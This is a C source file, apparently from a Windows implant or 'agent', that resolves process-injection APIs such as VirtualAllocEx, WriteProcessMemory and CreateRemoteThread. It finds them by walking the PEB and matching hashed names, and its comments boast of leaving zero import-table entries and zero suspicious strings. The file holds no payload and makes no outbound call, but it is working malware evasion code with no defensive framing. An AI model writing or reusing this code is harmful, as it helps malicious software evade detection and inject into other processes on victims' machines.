/*
 * iat_hide.c — Resolve sensitive Win32 APIs via PEB walk at startup.
 *
 * Every function pointer here is resolved from kernel32.dll's export table
 * by walking the PEB's InMemoryOrderModuleList — zero IAT entries, zero
 * GetProcAddress calls, zero suspicious strings.
 *
 * Call iat_hide_init() FIRST in main(), before any other code runs.
 */

/* We need the REAL windows.h declarations before iat_hide.h redefines them.
 * Include agent.h but prevent the iat_hide.h macros from firing here
 * by defining IAT_HIDE_IMPL. */
#define IAT_HIDE_IMPL
#include "agent.h"
#undef IAT_HIDE_IMPL

/* Now include api_resolve.h directly for the resolver */
#include "api_resolve.h"

/* ═══════════════════════════════════════════════════════════════════
 *  Global function pointers — all start NULL, resolved in init
 * ═══════════════════════════════════════════════════════════════════ */

pfn_LoadLibraryA       g_pLoadLibraryA       = NULL;
pfn_LoadLibraryW       g_pLoadLibraryW       = NULL;
pfn_GetProcAddress     g_pGetProcAddress     = NULL;
pfn_GetModuleHandleA   g_pGetModuleHandleA   = NULL;
pfn_GetModuleHandleW   g_pGetModuleHandleW   = NULL;
pfn_VirtualAlloc       g_pVirtualAlloc       = NULL;
pfn_VirtualAllocEx     g_pVirtualAllocEx     = NULL;
pfn_VirtualProtect     g_pVirtualProtect     = NULL;
pfn_VirtualProtectEx   g_pVirtualProtectEx   = NULL;
pfn_VirtualFree        g_pVirtualFree        = NULL;
pfn_OpenProcess        g_pOpenProcess        = NULL;
pfn_WriteProcessMemory g_pWriteProcessMemory = NULL;
pfn_ReadProcessMemory  g_pReadProcessMemory  = NULL;
pfn_CreateRemoteThread g_pCreateRemoteThread = NULL;
pfn_CreateProcessW     g_pCreateProcessW     = NULL;
pfn_GetCurrentProcess  g_pGetCurrentProcess  = NULL;

BOOL iat_hide_init(void) {
    /* Resolve all from kernel32 via PEB walk */
    g_pLoadLibraryA       = (pfn_LoadLibraryA)      api_resolve(HASH_KERNEL32, HASH_LoadLibraryA);
    g_pLoadLibraryW       = (pfn_LoadLibraryW)      api_resolve(HASH_KERNEL32, HASH_LoadLibraryW);
    g_pGetProcAddress     = (pfn_GetProcAddress)    api_resolve(HASH_KERNEL32, HASH_GetProcAddress);
    g_pGetModuleHandleA   = (pfn_GetModuleHandleA)  api_resolve(HASH_KERNEL32, HASH_GetModuleHandleA);
    g_pGetModuleHandleW   = (pfn_GetModuleHandleW)  api_resolve(HASH_KERNEL32, HASH_GetModuleHandleW);
    g_pVirtualAlloc       = (pfn_VirtualAlloc)      api_resolve(HASH_KERNEL32, HASH_VirtualAlloc);
    g_pVirtualAllocEx     = (pfn_VirtualAllocEx)    api_resolve(HASH_KERNEL32, HASH_VirtualAllocEx);
    g_pVirtualProtect     = (pfn_VirtualProtect)    api_resolve(HASH_KERNEL32, HASH_VirtualProtect);
    g_pVirtualProtectEx   = (pfn_VirtualProtectEx)  api_resolve(HASH_KERNEL32, HASH_VirtualProtectEx);
    g_pVirtualFree        = (pfn_VirtualFree)       api_resolve(HASH_KERNEL32, HASH_VirtualFree);
    g_pOpenProcess        = (pfn_OpenProcess)       api_resolve(HASH_KERNEL32, HASH_OpenProcess);
    g_pWriteProcessMemory = (pfn_WriteProcessMemory)api_resolve(HASH_KERNEL32, HASH_WriteProcessMemory);
    g_pReadProcessMemory  = (pfn_ReadProcessMemory) api_resolve(HASH_KERNEL32, HASH_ReadProcessMemory);
    g_pCreateRemoteThread = (pfn_CreateRemoteThread)api_resolve(HASH_KERNEL32, HASH_CreateRemoteThread);
    g_pCreateProcessW     = (pfn_CreateProcessW)    api_resolve(HASH_KERNEL32, HASH_CreateProcessW);
    g_pGetCurrentProcess  = (pfn_GetCurrentProcess) api_resolve(HASH_KERNEL32, HASH_GetCurrentProcess);

    /* Critical: if these fail, the agent can't function at all */
    return (g_pLoadLibraryA && g_pGetProcAddress && g_pVirtualAlloc &&
            g_pVirtualProtect && g_pGetModuleHandleA && g_pGetCurrentProcess);
}
